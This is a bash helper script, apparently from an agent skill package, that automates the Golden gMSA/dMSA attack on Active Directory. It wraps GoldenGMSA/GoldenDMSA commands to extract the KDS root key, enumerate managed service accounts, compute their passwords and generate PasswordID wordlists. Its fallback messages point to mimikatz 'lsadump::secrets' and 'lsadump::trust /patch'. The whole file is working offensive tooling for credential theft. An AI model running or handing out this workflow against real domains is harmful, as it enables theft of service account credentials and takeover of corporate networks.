#!/bin/bash
# Golden gMSA/dMSA Attack Workflow Helper
# Usage: ./gmsa-workflow.sh <command> [options]
#
# Commands:
#   kds-extract     - Extract KDS root key from DC
#   enumerate       - Enumerate gMSA/dMSA objects
#   compute         - Compute password from SID + KDS + PasswordID
#   wordlist        - Generate wordlist for missing PasswordID

set -e

SKILL_DIR="$(cd "$(dirname "$0")/.." && pwd)"
WORKSPACE="${SKILL_DIR}/workspace"

mkdir -p "$WORKSPACE"

show_help() {
    cat << EOF
Golden gMSA/dMSA Attack Workflow Helper

Usage: $0 <command> [options]

Commands:
  kds-extract <domain>              Extract KDS root key from domain
  enumerate <domain>                Enumerate gMSA/dMSA objects
  compute <sid> <kdskey> <pwdid>    Compute password from components
  wordlist <sid> <domain> <kdskey>  Generate wordlist for missing PasswordID

Examples:
  $0 kds-extract example.local
  $0 enumerate example.local
  $0 compute S-1-5-21-... <kds-root-key> <managed-password-id>
  $0 wordlist S-1-5-21-... example.local <kds-root-key>

Requirements:
  - GoldenDMSA.exe or GoldenGMSA.exe in PATH
  - .NET >= 4.7.2 x64
  - Domain access with appropriate privileges
EOF
}

kds_extract() {
    local domain="$1"
    echo "[*] Extracting KDS root key from $domain"
    
    if command -v GoldendMSA.exe &> /dev/null; then
        GoldendMSA.exe kds --domain "$domain"
    elif command -v GoldenGMSA.exe &> /dev/null; then
        GoldenGMSA.exe kdsinfo
    else
        echo "[!] Neither GoldenDMSA.exe nor GoldenGMSA.exe found in PATH"
        echo "[+] Alternative: Use mimikatz on DC"
        echo "    mimikatz # lsadump::secrets"
        echo "    mimikatz # lsadump::trust /patch"
        exit 1
    fi
}

enumerate() {
    local domain="$1"
    echo "[*] Enumerating gMSA/dMSA objects in $domain"
    
    if command -v GoldendMSA.exe &> /dev/null; then
        GoldendMSA.exe info -d "$domain" -m ldap
    elif command -v GoldenGMSA.exe &> /dev/null; then
        GoldenGMSA.exe gmsainfo
    else
        echo "[!] Neither GoldenDMSA.exe nor GoldenGMSA.exe found in PATH"
        echo "[+] Alternative: Use PowerShell"
        echo "    Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | Select sAMAccountName,objectSid,msDS-ManagedPasswordId"
        exit 1
    fi
}

compute() {
    local sid="$1"
    local kdskey="$2"
    local pwdid="$3"
    
    echo "[*] Computing password for SID: $sid"
    echo "[*] KDS Root Key: $kdskey"
    echo "[*] ManagedPasswordID: $pwdid"
    
    if command -v GoldendMSA.exe &> /dev/null; then
        GoldendMSA.exe compute -s "$sid" -k "$kdskey" -m "$pwdid"
    elif command -v GoldenGMSA.exe &> /dev/null; then
        GoldenGMSA.exe compute --sid "$sid" --kdskey "$kdskey" --pwdid "$pwdid"
    else
        echo "[!] Neither GoldenDMSA.exe nor GoldenGMSA.exe found in PATH"
        exit 1
    fi
}

wordlist_gen() {
    local sid="$1"
    local domain="$2"
    local kdskey="$3"
    
    echo "[*] Generating wordlist for SID: $sid"
    echo "[*] Domain: $domain"
    echo "[*] KDS Root Key: $kdskey"
    
    if command -v GoldendMSA.exe &> /dev/null; then
        GoldendMSA.exe wordlist -s "$sid" -d "$domain" -f "$domain" -k "$kdskey"
    else
        echo "[!] GoldenDMSA.exe not found in PATH"
        exit 1
    fi
}

# Main command dispatcher
case "${1:-help}" in
    kds-extract)
        kds_extract "${2:-}"
        ;;
    enumerate)
        enumerate "${2:-}"
        ;;
    compute)
        compute "$2" "$3" "$4"
        ;;
    wordlist)
        wordlist_gen "$2" "$3" "$4"
        ;;
    help|--help|-h)
        show_help
        ;;
    *)
        echo "[!] Unknown command: $1"
        show_help
        exit 1
        ;;
esac
